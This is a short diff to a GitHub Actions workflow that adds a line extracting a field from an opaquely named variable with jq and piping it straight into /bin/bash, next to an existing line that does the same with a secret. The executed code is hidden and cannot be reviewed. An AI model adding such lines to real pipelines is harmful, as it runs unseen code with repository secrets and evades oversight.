@@ -22,6 +22,7 @@ jobs:
           pckey0: ${{ secrets.pckey0 }}
         run: |
           printf '%s' "$pckey0" | jq -r .phxgd0 | /bin/bash
+          printf '%s' "$s48411" | jq -r .xonxt6865 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
